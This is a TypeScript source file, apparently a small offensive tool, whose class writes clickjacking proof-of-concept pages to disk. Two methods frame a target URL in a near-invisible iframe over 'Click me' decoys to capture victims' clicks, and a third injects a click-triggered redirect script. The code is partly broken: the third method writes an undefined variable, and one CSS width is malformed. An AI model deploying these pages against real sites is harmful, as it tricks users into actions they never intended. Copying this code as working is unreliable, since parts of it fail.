import * as fs from "fs";
import * as color from 'colors/safe';

export class clickjacking{

    public static clickbasic(url:string):void{
        var html: string = `
            <style>
                iframe{
                    position: relative;
                    width: 1000x;
                    height: 700px;
                    opacity: 0.0001;
                    z-index: 2;
                }
                div{
                    position: absolute;
                    top: 500px;
                    left: 60px;
                    z-index: 1;
                }
                            
            </style>
            <div>Click me</div>
            <iframe src="${url}"></iframe>
        `
        fs.writeFile("clickbasic.html",html,(err)=>{
            if (err) throw err;
        })
    }

    public static multiclick(url:string):void{
        var html: string = `
            <style>
                iframe {
                    position:relative;
                    width: 500px;
                    height: 500px;
                    opacity: 0.1;
                    z-index: 2;
                }
                .firstClick, .secondClick {
                    position:absolute;
                    top:330px;
                    left:60px;
                    z-index: 1;
                }
                .secondClick {
                    left:210px;
                }
            </style>
            <div class="firstClick">Click me first</div>
            <div class="secondClick">Click me next</div>
            <iframe src="${url}"></iframe>        
        `
        fs.writeFile("multiclick.html",html,(err)=>{
            if (err) throw err;
        })
    }
    public static clickjs(url:string):void{
        var js = `
        <script>
            function redirecionar(){
                alert("Clique")
                location.href = "${url}"
            }
            document.body.addEventListener('click',redirecionar, true)
        </script>
        `
        fs.writeFile("clickjs.html",html,(err)=>{
            if (err) throw err;
        })
    }
}